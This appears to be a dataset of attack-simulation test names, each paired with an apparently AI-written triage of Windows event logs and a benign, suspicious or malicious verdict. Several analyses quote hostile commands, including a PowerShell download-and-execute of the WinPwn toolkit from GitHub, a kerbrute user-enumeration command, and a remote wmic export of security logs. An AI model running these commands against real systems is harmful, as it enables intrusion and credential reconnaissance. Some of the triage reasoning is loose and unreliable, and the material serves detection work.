- **SUSPICIOUS**: The logs depict activity that aligns with potential reconnaissance or unauthorized surveillance within the network. This behavior warrants further investigation into the `admin_test` account's permissions and activity history to ascertain if the actions were authorized and expected, or if this could be an internal threat actor or external party via compromised credentials. It's crucial to check if these actions align with administrative maintenance routines or if they deviate from normal operational behavior. Logging and alerts around these specific actions should be increased to monitor for further anomalous activities."
WinPwn - General privesc checks,"Upon analyzing the provided Windows event logs, here is a detailed assessment:

### Summary of Findings:

1. **PowerShell Activity**:
   - The logs indicate that PowerShell was executed on `Server002` with specific attention to the execution of a PowerShell script from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`). The command used `iex` (Invoke-Expression) to execute the downloaded script. This is highly suspicious because it involves downloading and executing a script from the internet, which is a common tactic used in malware delivery known as ""Living off the Land"" (LotL).

2. **Sysmon Activity**:
   - Multiple processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` were executed by a user `SERVER002\\admin_test`. While each process on its own can be benign, the timing (all processes executed in a very short time frame) and the association with the suspicious PowerShell script suggests potential malicious activity attempting to blend in with normal administrative tasks.

3. **Network and System Processes**:
   - There are routine update processes for Microsoft Edge visible in the logs, executed by `NT AUTHORITY\SYSTEM`, which are consistent with background updates and don't indicate any compromise.

4. **Security and System Logs**:
   - There is an instance of time adjustment on `Server002`. The time synchronization is a normal process; however, adjusting system time can sometimes be a tactic to circumvent or evade certain logging features, but in this context, the adjustment seems consistent with normal NTP operations.

### Indicators of Malicious Activity:

- **Suspicious PowerShell Use**: The execution of a PowerShell script using Invoke-Expression to download code from an external source is often indicative of a direct attempt to execute potentially harmful scripts without detection.
- **Lack of Event Correlation**: There’s a lack of corresponding events that would typically indicate a legitimate administrative task utilizing these PowerShell commands. This suggests that the activity might be unauthorized or malicious.

### Resolution:

- **MALICIOUS**: The logs indeed contain activity that is highly indicative of malicious intentions, specifically due to the PowerShell execution downloading and running a script from the internet without any clear legitimate justification.

### Recommended Actions:

1. **Immediate Quarantine**: The machine involved, `Server002`, should be isolated from the network to prevent any potential spread or exfiltration of data.
2. **Further Forensic Analysis**: Obtain a full memory dump and disk image from `Server002` to conduct a deeper analysis to identify any changes or additional scripts/executables installed by the attack.
3. **Review Access Controls**: Investigate the account `SERVER002\admin_test` for unauthorized changes or unusual activity during the timeframe of these events.
4. **Report and Mitigate**: Notify the IT and Security Operations teams to address and contain the potential threat. Implement control measures such as restricting PowerShell execution policies and monitoring egress network traffic for anomalies.
5. **Update Security Protocols**: Review and potentially increase security measures such as endpoint detection and response solutions, and conduct a thorough security review of other systems to ensure they have not been similarly compromised.

Given these findings, appropriate steps should be taken to mitigate potential risks and properly secure the network environment from similar threats in the future."
Adfind - Enumerate Active Directory User Objects,"Upon examining the log entries provided for the Windows host, here is a detailed analysis:

### Analysis of Logs:

1. **PowerShell Log**: There are no entries provided from the Windows PowerShell log for analysis. PowerShell logs are crucial for detecting potential malicious scripts and command executions. Their absence is notable but doesn't contribute to the analysis.

2. **System and Security Logs**:
   - The Security log shows events for a SYSTEM logon and the assignment of several high-level privileges, which is typical for the `SYSTEM` account. However, this activity alone doesn't appear suspicious as it seems to be routinely conducted by system processes.

3. **Application Log**:
   - The logs primarily show events related to the ""Software Protection Platform Service"" and Windows Defender stating that the security product is on. These entries are routine and do not indicate suspicious behavior.

4. **Sysmon Log**:
   - Key processes observed:
     - Execution of `SecurityHealthService.exe`, `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `cmd operations related to `AdFind.exe`, and multiple Microsoft Edge Update related processes.
   - **Unusual Activity**:
     - The use of `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, could indicate enumeration activities. `wevtutil.exe` is often used to query or export event logs, which can be an indicator of post-exploitation or reconnaissance activity.
     - The execution of `cmd.exe` with a command line running `AdFind.exe`, a legitimate administrative tool, but frequently used by attackers for Active Directory enumeration, is suspicious. This tool is often favored by threat actors due to its ability to query AD information.
   - **Microsoft Edge Update Activity**:
     - The logs show numerous entries related to Microsoft Edge update processes. The process hierarchy, execution context (SYSTEM user), and continuance fall in line with automatic update processes, which are generally benign.

### Assessment:

The combination of running `wevtutil.exe` and executing `AdFind.exe` suggests possible unauthorized reconnaissance or post-exploitation activity. While these tools can also be used for legitimate administrative purposes, their presence alongside several command line tool executions flags potential misuse or malicious intent.

### Conclusion:

Given the use of `AdFind.exe`, which is often associated with malicious activity, along with other reconnaissance tools like `whoami.exe` and `wevtutil.exe`, the activity observed in these logs merits further investigation.

**Resolution**: **SUSPICIOUS**

### Recommendations:

1. **Immediate Actions**:
   - Investigate the `admin_test` user's activities around the time of these events. Determine if the actions were authorized or part of an automated script.
   - Review the command line arguments of PowerShell, CMD, and other process logs if available, to understand the intent.

2. **Long-term Actions**:
   - Monitor and audit the use of administrative tools like `AdFind.exe` and `wevtutil.exe` on high-value systems like the CEO's machine.
   - Consider implementing application whitelisting or alerting for specific command line tool executions associated with privilege escalation or reconnaissance.
   - Educate users on secure usage practices and increase security awareness regarding the use of dual-purpose tools."
Wevtutil - Discover NTLM Users Remote,"Upon analyzing the provided logs, several aspects of potential malicious activity stand out:

### Suspicious Behavior Observed:

1. **PowerShell Activity**: The logs indicate several PowerShell executions. The command appears to perform network operations and interacts with the 'wmic.exe' and 'wevtutil' utilities. The specific command executed involves exporting Windows security events, which may indicate a data exfiltration attempt:
   - `""powershell.exe"" & {$target = $env:LOGONSERVER, $target = $target.Trim(""\\"") $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\Event[System[(EventID=4776)]]'}`
   - Such usage of PowerShell for accessing network resources and exporting logs without legitimate need is suspicious.

2. **Sysmon Logs**:
   - The execution of `whoami.exe` and `hostname.exe` not inherently suspicious, but their sequence of execution from a PowerShell command context can indicate reconnaissance behavior.
   - The use of `wmic.exe` with command-line arguments to interact with remote nodes suggests possible command and control or lateral movement activities.

3. **Time Change**: There are logs indicating that the system time was adjusted. While not necessarily indicative of malicious activity, time changes can sometimes be used to evade detection mechanisms that rely on timestamp analysis.

4. **Edge Update Activity**: Legitimate processes like Microsoft Edge Update are active, but this activity could potentially mask malicious code execution if used in conjunction with persistence techniques or if hijacked.

### Risk Assessment:

- The PowerShell commands and related Sysmon logs suggest an attempt to query and possibly exfiltrate security-related logs (`EventID=4776` indicates NTLM authentication attempts).
- The operations conducted are often seen during sophisticated attacks like lateral movement within a network or data exfiltration.
- The controlled execution environment observed (such as running commands under high integrity) suggests potential administrative access used or gained.

### Recommended Actions:

1. **Immediate Investigation**:
   - Investigate the source and intent of the PowerShell commands.
   - Identify the user(s) responsible for executing these commands and verify if this activity was authorized.
   - Review firewall and IDS/IPS logs around the time of these events to identify any correlating network activity that could indicate data exfiltration.

2. **Containment Measures**:
   - Monitor for additional unusual activity from the user identified as ""SERVER002\\admin_test.""
   - Consider isolating the affected machine from the network temporarily for detailed forensic investigation.

3. **Mitigation**:
   - Audit and enforce stricter access controls, especially on privileged accounts.
   - Revoke any unnecessary administrative privileges and enforce least privilege principles.
   - Ensure all systems are up-to-date with security patches, especially for tools like PowerShell and WMIC.

4. **Long-term Strategy**:
   - Implement application whitelisting to control the execution of scripts and executables.
   - Conduct regular training and awareness sessions focused on recognizing phishing and social engineering methods that often lead to such compromises.

### Conclusion:
Resolution: **MALICIOUS**
The logs contain patterns and behaviors that are characteristic of malicious activity known to be used in complex attacks, such as data exfiltration or lateral movement within a network. Immediate investigation and remediation are advised to prevent potential data loss or further network compromise."
List Mozilla Firefox bookmarks on Windows with command prompt,"### Analysis of Windows Event Logs

The provided logs for the `Server002` computer indicate a mixture of routine system operations and potentially suspicious activities. Below is a detailed analysis of key aspects observed:

#### System and Application Logs:

1. **Microsoft Edge Update**:
   - Frequent invocations of Microsoft Edge Updater (`MicrosoftEdgeUpdate.exe`) are observed. These are mostly routine, as software updates commonly use similar processes. However, excessive execution could suggest an automated or unattended update mechanism that's potentially abused.

2. **Suspicious Process Executions**:
   - There are multiple instances of processes like `cmd.exe`, `whoami.exe`, `wevtutil.exe`, and `hostname.exe` being executed. While these are legitimate Windows utilities, the frequency and context of their invocation, particularly:
     - **CommandLine**: `""cmd.exe"" /c where /R C:\Users\ places.sqlite` – This command is a file search utility which might be used for reconnaissance.
     - **Execution Path and User Context**: Some of these utilities are run by `SERVER002\admin_test`, hinting at either an active admin session or potential misuse.

3. **Security Logs**:
   - Several events (e.g., 4798) involving enumeration of user accounts like `Administrator`, `Guest`, and `DefaultAccount` signal potential reconnaissance attempts.
   - Event 4672 shows the enabling of necessary privileges for an administrator, including `SeDebugPrivilege`, which can be concerning if occurring unexpectedly.

4. **User Account Activity**:
   - The identity `admin_test` appears to be involved in multiple high-integrity-level activities, including network service interactions and command-line operations, implying admin rights usage.

5. **Software Protection Platform Service (SPP)**:
   - Entries relating to the `Software Protection Platform Service` seem routine, associated with validation and activation of software licenses.

#### Security Concerns Identified:

- **Potentially Suspicious Activity**:
  - Frequent and potentially unnecessary execution of system utilities can signify an investigation or exploitation attempt.
  - Privilege assignment (Event ID 4672) with elevated privileges suggests scrutiny, as it involves sensitive operations typically reserved for admin tasks.

#### Final Assessment

Given the analysis, while no definitive malicious activities are confirmed, there are several **suspicious** indicators:

- Elevated and frequent execution of system utilities and administrative operations.
- Possible file searches and account enumerations that may be unauthorized.

### Resolution

- **Resolution: SUSPICIOUS** - The activity logged warrants further investigation to rule out potential misuse by unauthorized entities.

#### Guidance on How to Proceed:

1. **Monitor and Assess**:
   - Continuously monitor the machine `Server002` for unusual user login sessions, especially by `admin_test`, and analyze any new processes or unusual network activity.

2. **Account Verification**:
   - Verify the legitimacy of the `admin_test` account and ensure it complies with your company’s user policy.

3. **Security Assessment**:
   - Conduct a deeper security assessment of `Server002`, possibly involving scanning for malware, unexpected software modifications, and integrity checks.

4. **Privileges Review**:
   - Review and audit the privileges and permissions granted on `Server002` to ensure they align with security best practices.

This level of due diligence should help clarify the nature of the activities observed and provide assurance of system integrity."
Kerbrute - userenum,"The analysis of the provided Windows event logs reveals several observations and potential signs of malicious activity that warrant a detailed investigation:

1. **PowerShell Activity**: There are multiple logs indicating the execution of PowerShell commands on Server002, notably involving `kerbrute.exe` with user enumeration activity. This utility is generally used for Kerberos brute-forcing and is often associated with penetration testing and potentially malicious activity, especially if it's being used without prior authorization.

   - In the logs, we see the following command being executed via PowerShell:
     ```
     powershell.exe & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles"", .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\username.txt""}
     ```

   This command flags a high level of suspicion as it involves user enumeration which can be a preparatory step for an attack.

2. **Multiple wevtutil Executions**: The `wevtutil.exe` process (Windows Events Command Line Utility) has been executed multiple times by `admin_test`. Although `wevtutil.exe` is a legitimate utility, its frequent execution in a short time span without clear legitimate reasons could indicate an attempt to manipulate or clear event logs to cover tracks, which is a tactic sometimes used by attackers.

3. **Credential Access**: There are logs indicating multiple credential access attempts (Event IDs: 5379), which logged attempts to access credentials or tokens of a Microsoft Account. These failed attempts with the error code `3221226021` raise a concern about potential unauthorized access or enumeration of credentials.

4. **Process Execution by Admin User**: Several system utilities `cmd.exe`, `whoami.exe`, and `hostname.exe` are executed by the `admin_test` user. While this alone isn't inherently suspicious, in the context of the above discrepancies, it contributes to the suspicion.

5. **Incongruities in Log Events**: Despite the continuous security product state being `ON` (as shown by Windows Defender logs in the Application log), there is no direct indication of an alert from security products concerning the detected PowerShell and credential access activities. This can suggest either insufficient logging by the security software or logs being generated by tampered processes.

**Assessment and Guidance**:

- Based on the analyzed logs, there is a significant concern around unauthorized and potentially malicious activities, particularly due to the execution of `kerbrute.exe`, frequent `wevtutil` executions, and attempts at credential access.
- Given these activities, it is strongly advised to escalate the analysis to confirm any unauthorized access or compromise. This should include:
  - Examining any logs from security appliances that interacted with this machine.
  - Investigating the origin of the suspicious commands, possibly through forensic analysis.
  - Ensuring that known good configurations of security tools are enforced.
  - Confirming whether the `admin_test` account had legitimate reasons for the observed activities.

Considering these points, the situation should be marked as **MALICIOUS** due to the high likelihood of unauthorized or malicious activities involving user enumeration and potential log tampering to hide traces. An incident response should be initiated promptly."
WinPwn - bluekeep,"Upon analysis of the provided Windows event logs, here are the key findings and assessment:

### Key Findings:

1. **Time Change Events:**
   - There are multiple occurrences of EventID 4616 in the Security logs indicating a system time change by `svchost.exe` under the LOCAL SERVICE account. This activity could suggest attempts to alter forensic timelines or to bypass certain time-dependent security controls. However, the time change appears minor (e.g., 52 seconds), which may not be significant on its own but is something to consider in a broader context.

2. **Privilege Management:**
   - EventID 4672 shows a user `admin_test` being assigned a range of high-level privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While `admin_test` could be an administrative account, such privilege assignments should be closely monitored for unusual behavior or abuse.

3. **Logon Events with NTLM:**
   - EventID 4624 indicates a successful logon using NTLM, coming from `DESKTOP-3HL5B2P`. The use of NTLM (especially without detailed monitoring constraints like time or place) raises some concerns about the security of the authentication method being used, as NTLM is generally considered less secure than Kerberos.

4. **Sysmon and PowerShell Activity:**
   - There is a concerning execution of PowerShell (`powershell.exe`) with a command that downloads a script (`WinPwn.ps1`) from a GitHub repository (`S3cur3Th1sSh1t/WinPwn`). This potentially indicates an execution of a known penetration testing tool or malicious script.
   - The PowerShell command appears directly associated with actions often seen in penetration testing or malware deployment. Such behavior would typically be flagged as high risk, especially if executed in a manner involving administrative privileges or networked systems.

5. **Process Execution Related to EdgeUpdate:**
   - The logs contain multiple Sysmon events regarding EdgeUpdate activities, which seems normal for the update process. However, this activity is overshadowed by the PowerShell execution that appears within a similar time frame.

### Assessment:

Given the PowerShell execution that directly downloads and possibly executes a script from an external source without explicit administrator intent or knowledge — especially in the context of an account with elevated privileges — this suggests malicious behavior.

The combination of changing system time, elevation of privileges to `admin_test`, suspicious PowerShell executions, and dependence on NTLM authentication (which is weaker and more susceptible to network attacks) elevates this from merely suspicious activity to clear potential malicious intent.

### Resolution:

**MALICIOUS**

### Guidance/Next Steps:

1. **Immediate Response:**
   - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
   - Conduct a full malware scan on the affected host to identify any malicious software.

2. **Further Investigation:**
   - Perform a deeper investigation into the user `admin_test`, particularly focusing on how the elevated privileges are being used and whether any other suspicious activities have been initiated by this account.
   - Review network traffic logs surrounding the timeframe of the PowerShell activity to ascertain any external communications, specifically to or from known malicious IPs or domains.

3. **Protective Measures:**
   - Consider disabling or restricting PowerShell usage by policy for non-administrative accounts, implementing Just Enough Administration (JEA) where applicable.
   - Transition away from NTLM, enforcing the use of Kerberos authentication for enhanced security.
   - Establish more rigorous monitoring and alerting for system time changes, privilege escalation events, and external script execution activities.

This assessment should feed into an incident response procedure to fully mitigate potential threats and future occurrences."
Process Discovery - tasklist,"### Detailed Analysis of the Logs

#### System Logs:
- **Time Change Events**: There are several time change events (Event ID 24 and Event ID 1), which indicate that the system time was updated. These changes involved `svchost.exe` indicating the time reverted from `19:11:37` to `19:11:08`. Such modifications can be due to normal NTP sync activities; however, arbitrary time changes can also be leveraged in attacks to bypass time-based security measures.
  
- **NTP Source**: System time is adjusted via `time.windows.com` NTP server (Event ID 35), which is typical for Windows environments. This adjustment was logged as expected with no anomalies in the process.

#### Sysmon Logs:
- **Unexpected Processes**: Multiple instances of typical system utilities are observed (`whoami.exe`, `HOSTNAME.EXE`, `conhost.exe`, `wevtutil.exe`, and `tasklist.exe`).
   - Commands like `whoami.exe` and `tasklist` may suggest script execution or privilege enumeration attempts, especially if run interactively or in close succession.
   - The frequent appearance of `wevtutil.exe` could indicate log changes or access attempts, possibly to clear tracks.

- **User Accounts**: All Sysmon log events reflect actions by a user account `SERVER002\\admin_test`. Administrative test accounts used in production environments can pose a risk if not monitored carefully.

- **Process Trees and Integrity Levels**: The logs show that these processes have been initiated under high integrity levels, indicating they have elevated privileges. This is normal for some administrative tasks but can be problematic if used maliciously.

#### Security Logs:
- **Time Change Related Audits**: Event ID 4616 logged two time updates by `svchost.exe`. These logs corroborate the time change events in the System logs, maintaining consistency.

#### Application Logs:
- **Software Protection Platform Service**: Indicates routine activity related to Microsoft's Software Protection Platform, which doesn't appear anomalous or malicious in nature.

### Assessment of the Situation

- **Anomalous Behavior**: The consistent triggering of utilities like `whoami.exe`, `wevtutil.exe`, and command-line operations (`cmd.exe` with `tasklist`) concentrated within a short timeframe is somewhat anomalous. These tools are often used in reconnaissance and preparation stages of an attack.

- **Security Concerns**: Although these actions could be routine from an admin performing legitimate work, when considered together with test user accounts and time alterations, this could suggest unauthorized or preparatory actions for further compromise.

### Recommendation and Resolution

- **Resolution**: **SUSPICIOUS**

The logs contain activity that warrants further investigation. It's important to verify:
- The context around the use of administrative test accounts.
- The legitimacy of the time changes and the rapid sequence of command executions.
- Whether these tasks were logged with corresponding authorized work orders or maintenance activities.

### Guidance on How to Proceed

1. **Validate User Activity**: Review user access logs to determine if `SERVER002\\admin_test` account activities were authorized and if usage patterns are consistent with legitimate use.
   
2. **Inspect Command Usage**: Check if the sequence of commands initiated (`whoami.exe`, `wevtutil.exe`, `tasklist.exe`) aligns with any known administrative tasks or maintenance scripts.
   
3. **Correlate Time Change Events**: Confirm whether any service or network issues were reported at the time of the observed time changes.
   
4. **Review Security Policies**: Ensure that NTP settings and administrative account controls are appropriately applied, preventing any potential misuse.

5. **Increase Monitoring**: Heighten monitoring on this user account and associated processes to detect any future suspicious activities in real time."
Applications Installed,"### Detailed Analysis of the Logs:

#### System Logs:
1. **Time Synchronization Events**:
   - Multiple time synchronization events are logged with EventID 24 (Kernel-General) and 35 (Time-Service). These are typical system activities where the system clock is adjusted, usually interacting with a time server like `time.windows.com`. The synchronization activities seem to be non-alarming and are expected in a normal Windows operational environment.

2. **Process Execution**:
   - The process `svchost.exe` is responsible for time synchronization. `svchost.exe` is a generic host process name for services run from dynamic-link libraries (DLLs). This behavior is consistent with typical Windows operations, particularly regarding time updates.

#### PowerShell Logs:
1. **PowerShell Execution**:
   - The execution of PowerShell script seems to query installed software via registry keys using the `Get-ItemProperty` cmdlet. This script is benign and often used in administrative tasks to audit installed software on the system. The activity appears to have been executed by a user with administrative credentials (indicated by the user `SERVER002\admin_test` in Sysmon logs).

   - The PowerShell command does not exhibit any indicators of compromise, such as the use of obfuscated or encoded commands, attempts to download remote scripts, or unauthorized modifications to sensitive system areas.

#### Security Logs:
1. **Time Change Record**:
   - These logs align with the system logs indicating changes to system time, executed by the local service account. This activity shows a correlation with the time service events and does not inherently suggest malicious activity.

#### Sysmon Logs:
1. **Process Executions**:
   - Instances of typical Windows utility executions are logged such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. These are standard utilities used to display information about users, manage event logs, and identify the system name.
   
2. **No Evidence of Malicious Indicators**:
   - The processes and their command-line arguments observed in the logs do not indicate any malicious activities. No anomalies such as unsigned or unknown software, unusual paths, or privilege escalations are noted.

### Assessment:
- **Anomalous Behavior**: The logs appear typical for a user or system administrator performing routine operations like software inventory management, system command executions, time synchronization, and system identification commands.
  
- **Indicators of Compromise**: No clear indicators of a security breach, such as unauthorized access attempts, unusual privilege escalation, or suspicious network connections, are present in the logs.

### Resolution:
- **BENIGN**: The activities described in the logs reflect standard administrative practices and system operations without any signs of malicious activity or compromise. No further action is required unless more context or information suggests a deeper investigation is warranted.

### Guidance on How to Proceed:
- Since the activities appear benign, typical logging and monitoring should continue. Ensure that security patches are applied regularly, access controls are audited, and incident response plans are up to date for quicker action in case any suspicious activities are detected in the future."
Enumerate Active Directory Computers with Get-AdComputer,"### Analysis Report

#### Overview
The logs provided for analysis include entries from the Application, System, Sysmon, Security, and Windows PowerShell logs. These logs were generated on ""Server002"" and cover various system activities.

#### Suspicious or Anomalous Behavior

- **Sysmon Logs**:
  - Frequent execution of ""wevtutil.exe"" and ""conhost.exe"", typically used for managing Windows Event logs and console applications, respectively, were observed. While these tools are legitimate, their repetitive execution as documented could be indicative of aggressive logging or command line activities. The user associated with these executions, ""SERVER002\\admin_test"", hints at administrative privilege utilities, which isn't alarming given typical administration tasks.
  - **PowerShell Execution**: 
    - The command `""powershell.exe"" & {Get-AdComputer -Filter *}` was executed by the user ""SERVER002\\admin_test"". This command retrieves AD computer objects. While it's a typical administrative task, using PowerShell in audit logs without specific context could also suggest scripted or automated administrative tasks.
  
- **Windows PowerShell Log**:
  - Corresponding events in the PowerShell log show the initiation of the command and its terminating state. This activity in isolation doesn't portray malicious intent, but it solidifies that System Management automation might be occurring, consistent with administrative functions.
  
#### Benign Activities
- **System Updates**:
  - The System logs indicate Microsoft Defender Antivirus updates. The presence of such events generally suggests standard system maintenance.

- **Security Log Events**:
  - Numerous references to unsuccessful credential access events (Event ID 5379) are seen with the `ReturnCode=3221226021`, denoting denied access. This could align with typical failed attempts in automatic processes validating credentials, perhaps due to service account operations.

#### Potential Indicators of Malicious Activity
While there are multiple administrative tools usage logs (e.g., `whoami.exe`, `hostname.exe`, `powershell.exe`), they fit common administrative tasks. There's no clear evidence of malicious code execution, file manipulation attempts, exfiltration behaviors, unusual persistence mechanisms, or privilege escalations beyond typical administrative commands.

#### Recommendation and Conclusion

- **Resolution**: **SUSPICIOUS**
  - Given the frequent execution of administrative tools in quick succession, combined with PowerShell activity, it might be indicative of a highly automated or scripted task occurring on the system. Although no clear evidence of malicious activity is observed, the context around these operations isn't fully known from the logs alone. Further investigation to verify administrative tasks, scripts in place on Server002, review of corresponding users or system accounts' purpose might help.

#### Guidance
To proceed:
1. Confirm the intention behind the script (`Get-AdComputer -Filter *`) execution from 'admin_test'.
2. Review any authorized scripts or automated tasks scheduled on Server002.
3. Ensure the system's accounts and permissions align with organizational policy.
4. Gather any external threat intelligence to further verify the legitimacy of similar patterns within known threat vectors.

By performing these actions, the organization can more confidently classify activities as benign system operations or identify potential areas needing corrective action."
Network Share Discovery command prompt,"Upon reviewing the provided Windows Event Logs, I've made the following observations:

1. **Edge Update Activities**:
    - Consistent activities involving `Microsoft Edge Update` processes observed largely initiated by the `NT AUTHORITY\SYSTEM`. These include frequent start and stop of the `MicrosoftEdgeUpdate.exe` process, with various command-line arguments like `/svc`, `/update`, `/regsvc`, and `/regserver`. This is typical of legitimate update activities.

2. **Process Execution**:
   - The usage of Windows native utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `cmd.exe`, `whoami.exe`, and `net.exe` appears frequently.
   - Notably, `cmd.exe` is seen executing `net view \\localhost`, and `whoami.exe` is being run by the `admin_test` user. While these commands can be indicative of enumeration activities, they are not inherently malicious without context of improper use.

3. **Privilege Events**:
   - The `admin_test` account is noted to have numerous privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.) as part of its login session (EventID 4672), which can be typical for an admin account but demands scrutiny due to the potential for privilege abuse.

4. **Time Manipulation**:
   - There is evidence of system time changes by `svchost.exe` (Security Auditing EventID 4616; Kernel-General EventID 1). Time adjustments can be suspicious as they are sometimes employed by malicious actors to manipulate timestamps or evade logging.

5. **Logon and Logoff Activities**:
   - Logon (ID 4624) and logoff (ID 4634) events for the user `admin_test` suggest potential remote sessions (Logon type 3).
   - The `NTLM` authentication protocol is noted, which is common but, if outdated, can present security risks.

**Assessment**: 

- **Suspicious Time Changes**: The modification of system time stands out, often a tactic to evade detection.
- **High Privilege Usage by `admin_test`**: While having high privileges can be standard, the associated activities should be verified against expected behavior for this account.
- **Frequent System Utility Usage**: While legitimate in many contexts, repeated or nonsensical usage patterns warrant further investigation.

**Recommendation**:
- Verify any scheduled tasks or automated processes that might explain these logs.
- Conduct a thorough review of the `admin_test` account usage, ensuring no misuse of privileges.
- Investigate any potential misconfigurations in time synchronization settings.
- Validate the legitimacy and integrity of Microsoft Edge Update processes via cross-referencing with official update release notes from Microsoft.

**Resolution**: **SUSPICIOUS**

The observed activities, particularly the time changes and elevated privileges usage, merit further detailed investigation before confirming malicious activity."
System Information Discovery (2),"Upon analyzing the provided logs, here is a detailed assessment:

**Suspicious or Anomalous Behavior:**
1. **Sequential Execution of System Utilities:**
   - There is a pattern of execution involving multiple native Windows utilities, such as `cmd.exe`, `wevtutil.exe`, `cmd.exe /c wscript.exe`, `conhost.exe`, `gpresult.exe`, `reg.exe`, `net.exe`, `netsh.exe`, and others.
   - Numerous command executions are directed towards extracting system configuration information or logs, such as `gpresult`, `reg export`, `whoami`, `hostname`, `sc.exe`, amongst others.
   - These utilities are often executed by the user `SERVER002\admin_test`, all within a short time frame, indicating possible automation or script execution.

2. **Windows Management Instrumentation (WMI) Usage:**
   - Execution of `wmic qfe` and related commands indicates queries or alterations happening at a detailed system level, typically indicative of scripting or automated system inventory/management.

3. **Extensive Use of PowerShell:**
   - Commands through PowerShell are focusing on network adapter configurations, routes, DNS client policies, and similar operations.
   - This could indicate an attempt to gather extensive system and network information for reconnaissance.

4. **Script Execution with Wscript:**
   - The execution of `wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs` indicates the use of Windows Script Host (WSH) to potentially execute scripts that gather system and network configuration details. This is unconventional for regular user activity, especially on a server handling administrative tasks.

5. **Time Manipulation Events:**
   - The logs show several instances of time changes, potentially in an attempt to cover tracks related to actions taken or to bypass security mechanisms sensitive to time-based operations.

6. **Privileges and Process Execution:**
   - Multiple processes are performed with high integrity, indicating potential administrative capabilities, which, if exploited, can lead to lateral movement or privilege escalation.
   - The appearance of privileges such as `SeDebugPrivilege` can be concerning if appearing in inappropriate contexts.

**Indicators of Malicious Activity or Compromise:**
- The combination of command executions, PowerShell scripting for network querying, and WMI involvement point towards reconnaissance and potential lateral movement within the system.
- Indicators show an overlap with common tactics in penetration testing or exploitation activities, such as gathering detailed environment information before exploiting vulnerabilities.

**Assessment of the Situation:**
Considering the nature of the operations and their tightly grouped execution within a limited timeframe, these actions are highly suspicious. They are characteristic of a script or malware attempting to map out the network, gather information, or prepare for further exploitation.

**Resolution: SUSPICIOUS**
- The activities logged are highly indicative of reconnaissance or preliminary exploit activity but lack direct evidence of malicious payload execution or successful compromise.

**Guidance on How to Proceed:**
1. **Immediate Monitoring & Investigation:**
   - Continue to monitor the systems for further suspicious activity or unauthorized access attempts.
   - Investigate the origin of the script and logs to determine the intent and scope.

2. **Security Enhancements:**
   - Ensure that antivirus and endpoint detection and response (EDR) solutions are up to date.
   - Review and tighten security permissions, especially around administrative accounts and privileged processes.
   - Apply stricter monitoring of sensitive command executions via scripting environments like PowerShell.

3. **Conduct a Thorough Incident Response:**
   - If possible, retrieve and analyze the `gatherNetworkInfo.vbs` and any other scripts to understand their full function and intention.
   - Check for known vulnerabilities and patch accordingly.

This detailed approach should help in determining whether the activities observed are part of a legitimate user error or indicative of a more significant security incident."
WinPwn - Dotnetsearch,"Upon reviewing the provided logs, several events stand out that may indicate malicious behavior:

1. **PowerShell Activity**:
   - The Windows PowerShell logs display the execution of a script from a GitHub repository named ""S3cur3Th1sSh1t"", specifically the ""WinPwn.ps1"" script. This script is downloaded and executed using PowerShell, which is a common technique used by attackers to deliver and execute malicious payloads. The execution of remote scripts, especially from URLs without verification, is suspicious and indicative of a potential security breach.

2. **Time Change Events**:
   - In the Security and System logs, there are records (Event ID 4616) of time changes on the system. Frequent or unexplained changes to system time can be associated with attempts to manipulate logs or evade detection mechanisms. However, in isolation, these could potentially be part of normal operations or corrections.

3. **Edge Update Activity**:
   - There are numerous entries in the Sysmon log regarding the execution of various Microsoft Edge Update processes. While the execution of update processes itself is not unusual, the frequency and scale of these entries, combined with the PowerShell execution, suggest potential for unusual activity or exploitation.

4. **Sysmon Process Creation**:
   - The Sysmon logs show multiple instances of command line invocations and process creations, consistent with exploratory activities or lateral movement within a compromised system. The key processes, such as `wevtutil.exe` and `conhost.exe`, are standard, but the context within which they are executed is relevant.

**Assessment**:
The combination of a suspicious PowerShell execution downloading and running scripts from a third-party repository, coupled with other potentially abnormal system modifications, suggests that the system may have been compromised.

**Threat and Risk**:
- The download and execution of scripts from non-verified sources pose a significant risk of malware being introduced into the network. Such actions can lead to data breaches, unauthorized access, or further exploitation.
- Unexplained time changes might indicate an attempt to manipulate logs or evade detection.

**Guidance**:
- Immediately perform a deep forensic analysis of the system to understand the scope and impact of the compromise.
- Isolate the affected system from the network to prevent further spread or damage.
- Identify and review any other systems that might have been contacted or impacted.
- Implement strict network monitoring and enhance PowerShell logging for real-time alerts on suspicious activities.
- Educate users on identifying phishing attempts and safe browsing practices.

**Resolution**: MALICIOUS - The evidence strongly suggests malicious activity on the system due to the suspicious PowerShell execution and the context of other logged activities. Further action is required to contain and remediate the compromise."
Display group policy information via gpresult,"After reviewing the provided Windows event logs, the following observations were made:

### Anomalies and Analysis:
1. **Time Discrepancy:** 
   - Security logs (Event ID 4616) indicate a discrepancy in system time, where the system time was adjusted backwards and forwards. This could suggest attempts to hide malicious activity timestamps, but it can also be caused by legitimate time synchronization processes.

2. **Process Execution:**
   - Multiple executions of `whoami.exe`, `cmd.exe` with `/c gpresult /z`, and several instances of `MicrosoftEdgeUpdate.exe` are noted. While `whoami.exe` checks the identity of the user and `gpresult` shows Group Policy results, their repeated use may suggest an investigation into user permissions or system configuration.
   - `MicrosoftEdgeUpdate.exe` operations are abundant, suggesting regular updates or potentially abuse by a malicious actor masquerading as legitimate updates.

3. **Integrity Levels and User Contexts:**
   - Processes like `MicrosoftEdgeUpdate.exe` and `whoami.exe` run under high integrity or system levels, executed under administrative or system user contexts, indicating they have elevated privileges.

4. **Edge Update Processes:**
